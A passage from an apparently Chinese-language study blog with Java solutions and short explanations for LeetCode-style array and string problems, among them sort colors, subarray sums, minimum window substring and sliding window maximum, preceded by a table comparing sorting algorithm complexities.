class="table-container"><table><thead><tr><th>排序方法</th><th>时间复杂度(平均)</th><th>时间复杂度(最坏)</th><th>时间复杂度(最好)</th><th>空间复杂度</th><th>稳定性</th><th>复杂性</th></tr></thead><tbody><tr><td>直接插入排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n)</td><td>O(1)</td><td>稳定</td><td>简单</td></tr><tr><td>希尔排序</td><td>O(nlog2n)</td><td>O(n2)</td><td>O(n1.3)</td><td>O(1)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>直接选择排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n2)</td><td>O(1)</td><td>不稳定</td><td>简单</td></tr><tr><td>堆排序</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(1)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>冒泡排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n)</td><td>O(1)</td><td>稳定</td><td>简单</td></tr><tr><td>快速排序</td><td>O(nlog2n)</td><td>O(n2)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>归并排序</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(n)</td><td>稳定</td><td>较复杂</td></tr><tr><td>基数排序</td><td>O(d(n+r))</td><td>O(d(n+r))</td><td>O(d(n+r))</td><td>O(n+r)</td><td>稳定</td><td>较复杂</td></tr></tbody></table></div><p>正常的排序算法没有满足的，此题的特殊条件是只有三个元素。</p><p>可以借鉴冒泡排序，冒泡排序外层循环n - 1躺，每趟将一个元素放到最终位置，这里一共三种元素，用两次遍历每次将一种元素归位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length, k = <span class="number">0</span>, tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            nums[i] = nums[k];</span><br><span class="line">            nums[k++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = k; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == <span class="number">1</span>)&#123;</span><br><span class="line">            nums[i] = nums[k];</span><br><span class="line">            nums[k++] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-12-除自身以外数组的乘积"><a href="#1-12-除自身以外数组的乘积" class="headerlink" title="1.12 除自身以外数组的乘积"></a>1.12 除自身以外数组的乘积</h2><p>同剑指offer构建乘积数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] productExceptSelf(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.length == <span class="number">0</span>)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];&#125;</span><br><span class="line">    <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        b[i] = b[i-<span class="number">1</span>] * nums[i-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = nums.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="comment">//tmp记录右边部分乘积</span></span><br><span class="line">        tmp *= nums[i+<span class="number">1</span>];</span><br><span class="line">        b[i] *= tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-13-和为k的子数组"><a href="#1-13-和为k的子数组" class="headerlink" title="1.13 和为k的子数组"></a>1.13 和为k的子数组</h2><p>连续子数组首先考虑滑动窗口，但数组中的值允许为负数，所以滑动窗口不可行。</p><p>使用前缀和的方法求解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n =nums.length;</span><br><span class="line">    <span class="comment">//map&lt;前缀和，出现次数&gt;</span></span><br><span class="line">    HashMap&lt;Integer,Integer&gt; preSum = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="comment">//base case</span></span><br><span class="line">    preSum.put(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>, sum0_i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        sum0_i += nums[i];</span><br><span class="line">        <span class="keyword">int</span> sum0_j = sum0_i - k;</span><br><span class="line">        <span class="keyword">if</span>(preSum.containsKey(sum0_j))&#123;</span><br><span class="line">            ans += preSum.get(sum0_j);</span><br><span class="line">        &#125;</span><br><span class="line">        preSum.put(sum0_i,preSum.getOrDefault(sum0_i,<span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-14-最短无序连续子数组"><a href="#1-14-最短无序连续子数组" class="headerlink" title="1.14 最短无序连续子数组"></a>1.14 最短无序连续子数组</h2><p>最简单思路是将数组排序后的结果和原数组比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findUnsortedSubarray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] nums2 = Arrays.copyOf(nums, nums.length);</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">int</span> left = -<span class="number">1</span>, right = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] != nums2[i])&#123;</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                left = i;</span><br><span class="line">                flag = !flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> right - left &gt; <span class="number">0</span> ? right - left + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-15-无重复字符的最长子串"><a href="#1-15-无重复字符的最长子串" class="headerlink" title="1.15 无重复字符的最长子串"></a>1.15 无重复字符的最长子串</h2><p>同剑指offer最长不含重复字符的子字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(right &lt; s.length())&#123;</span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(right);</span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">//更新数据</span></span><br><span class="line">        map.put(c,map.getOrDefault(c,<span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//左侧收缩</span></span><br><span class="line">        <span class="keyword">while</span>(map.get(c) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">char</span> d = s.charAt(left);</span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">//更新数据</span></span><br><span class="line">            map.put(d,map.get(d) - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res = Math.max(res,right - left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-16-寻找重复数"><a href="#1-16-寻找重复数" class="headerlink" title="1.16 寻找重复数"></a>1.16 寻找重复数</h2><p>同剑指offer数组中重复的数字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span> (nums[i]!=i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==nums[nums[i]])&#123;</span><br><span class="line">                <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            temp=nums[i];</span><br><span class="line">            nums[i]=nums[temp];</span><br><span class="line">            nums[temp]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-17-搜索二维矩阵Ⅱ"><a href="#1-17-搜索二维矩阵Ⅱ" class="headerlink" title="1.17 搜索二维矩阵Ⅱ"></a>1.17 搜索二维矩阵Ⅱ</h2><p>初始化一个指向矩阵左下角的 (row，col) 指针。然后，直到找到目标并返回 true（或者指针指向矩阵维度之外的 (row，col)为止，我们执行以下操作：如果当前指向的值大于目标值，则可以 “向上” 移动一行。 否则，如果当前指向的值小于目标值，则可以移动一列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">searchMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> row = matrix.length - <span class="number">1</span>, col = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(row &gt;= <span class="number">0</span> &amp;&amp; col &lt;= matrix[<span class="number">0</span>].length - <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix[row][col] &lt; target)&#123;</span><br><span class="line">            col++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(matrix[row][col] &gt; target)&#123;</span><br><span class="line">            row--;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-18-找到字符串中所有字母异位词"><a href="#1-18-找到字符串中所有字母异位词" class="headerlink" title="1.18 找到字符串中所有字母异位词"></a>1.18 找到字符串中所有字母异位词</h2><p>开始代码是这样，但遇到长的测试用例无法通过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findAnagrams</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; window = <span class="keyword">new</span> HashMap();</span><br><span class="line">    HashMap&lt;Character, Integer&gt; need = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : p.toCharArray())&#123;</span><br><span class="line">        need.put(c, need.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">    LinkedList&lt;Integer&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(right &lt; s.length())&#123;</span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(right);</span><br><span class="line">        right++;</span><br><span class="line">        <span class="keyword">if</span>(need.containsKey(c))&#123;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(window.get(c) == need.get(c))&#123;<span class="comment">//换成equals</span></span><br><span class="line">                valid++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(right - left &gt;= p.length())&#123;</span><br><span class="line">            <span class="keyword">if</span>(valid == need.size())&#123;</span><br><span class="line">                res.add(left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> d = s.charAt(left);</span><br><span class="line">            left++;</span><br><span class="line">            <span class="keyword">if</span>(need.containsKey(d))&#123;</span><br><span class="line">                <span class="keyword">if</span> (window.get(d) == need.get(d))<span class="comment">//换成equals</span></span><br><span class="line">                    valid--;</span><br><span class="line">                window.put(d, window.get(d) - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer 在大于127 的时候 不从常量池里拿，是个对象，比较的也就不是数值，所以换成equals</p><h2 id="1-19-寻找两个正序数组的中位数"><a href="#1-19-寻找两个正序数组的中位数" class="headerlink" title="1.19 寻找两个正序数组的中位数"></a>1.19 寻找两个正序数组的中位数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length1 = nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="keyword">int</span> totalLength = length1 + length2;</span><br><span class="line">        <span class="keyword">if</span> (totalLength % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> midIndex = totalLength / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">double</span> median = getKthElement(nums1, nums2, midIndex + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> median;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> midIndex1 = totalLength / <span class="number">2</span> - <span class="number">1</span>, midIndex2 = totalLength / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">double</span> median = (getKthElement(nums1, nums2, midIndex1 + <span class="number">1</span>) + getKthElement(nums1, nums2, midIndex2 + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">return</span> median;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getKthElement</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length1 = nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> kthElement = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 边界情况</span></span><br><span class="line">            <span class="keyword">if</span> (index1 == length1) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index2 == length2) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Math.min(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 正常情况</span></span><br><span class="line">            <span class="keyword">int</span> half = k / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> newIndex1 = Math.min(index1 + half, length1) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> newIndex2 = Math.min(index2 + half, length2) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> pivot1 = nums1[newIndex1], pivot2 = nums2[newIndex2];</span><br><span class="line">            <span class="keyword">if</span> (pivot1 &lt;= pivot2) &#123;</span><br><span class="line">                k -= (newIndex1 - index1 + <span class="number">1</span>);</span><br><span class="line">                index1 = newIndex1 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= (newIndex2 - index2 + <span class="number">1</span>);</span><br><span class="line">                index2 = newIndex2 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-20-最小覆盖子串"><a href="#1-20-最小覆盖子串" class="headerlink" title="1.20 最小覆盖子串"></a>1.20 最小覆盖子串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">minWindow</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; window = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Character, Integer&gt; need = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : t.toCharArray())&#123;</span><br><span class="line">        need.put(c, need.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, len = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">while</span>(right &lt; s.length())&#123;</span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(right);</span><br><span class="line">        right++;</span><br><span class="line">        <span class="keyword">if</span>(need.containsKey(c))&#123;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(window.get(c).equals(need.get(c)))&#123;</span><br><span class="line">                valid++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(valid == need.size())&#123;</span><br><span class="line">            <span class="keyword">if</span>(right - left &lt; len)&#123;</span><br><span class="line">                start = left;</span><br><span class="line">                len = right - left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> d = s.charAt(left);</span><br><span class="line">            left++;</span><br><span class="line">            <span class="keyword">if</span>(need.containsKey(d))&#123;</span><br><span class="line">                <span class="keyword">if</span>(window.get(d).equals(need.get(d)))&#123;</span><br><span class="line">                    valid--;</span><br><span class="line">                &#125;</span><br><span class="line">                window.put(d, window.get(d) - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len == Integer.MAX_VALUE ? <span class="string">&quot;&quot;</span> : s.substring(start, start + len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意窗口的移动一直是[left,right)左闭右开区间，所以right - left计算的也是子串实际长度，因为java的substring(beginindex,endindex)不包含endindex，所以可以直接代入。</p><h2 id="1-21-滑动窗口最大值"><a href="#1-21-滑动窗口最大值" class="headerlink" title="1.21 滑动窗口最大值"></a>1.21 滑动窗口最大值</h2><p>同剑指offer滑动窗口最大值。</p><p>首先想使用滑动窗口算法，滑动窗口可以在区间发生变化时，<strong>通过旧有的计算结果对搜索空间进行剪枝，这样便减少了重复计算，降低了时间复杂度</strong>。但是在这里滑动窗口无法复用结果进行剪枝。</p><p>我们可以将当前窗口最大值和新加入的值进行比较，但在删除最左侧元素时会出现两种情况：</p><ul><li>窗口最左侧元素不是窗口最大值，可以放心删除</li><li>窗口最左侧元素是窗口最大值，根据该窗口最大值是否唯一又两种情况：<ul><li>不唯一，放心删除</li><li>唯一，删除后重新遍历窗口获得最大值，次操作复杂度O(k)</li></ul></li></ul><p>所以可以强行使用滑动窗口，但操作不仅复杂而且时间复杂度为O(nk)</p><p>使用双端队列解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] maxSlidingWindow(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">    Deque&lt;Integer&gt; deque = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length - k + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//形成初始窗口</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast())&#123;</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">        deque.add(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    res[index++] = deque.peekFirst();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = k; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="comment">//若上个窗口元素==队列最大值，删除</span></span><br><span class="line">        <span class="keyword">if</span>(deque.peekFirst() == nums[i - k])&#123;</span><br><span class="line">            deque.removeFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//队列添加元素</span></span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast())&#123;</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">        deque.addLast(nums[i]);</span><br><span class="line">        res[index++] = deque.peekFirst();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-22-最长连续子序列"><a href="#1-22-最长连续子序列" class="headerlink" title="1.22 最长连续子序列"></a>1.22 最长连续子序列</h2><p>​    我们考虑枚举数组中的每个数 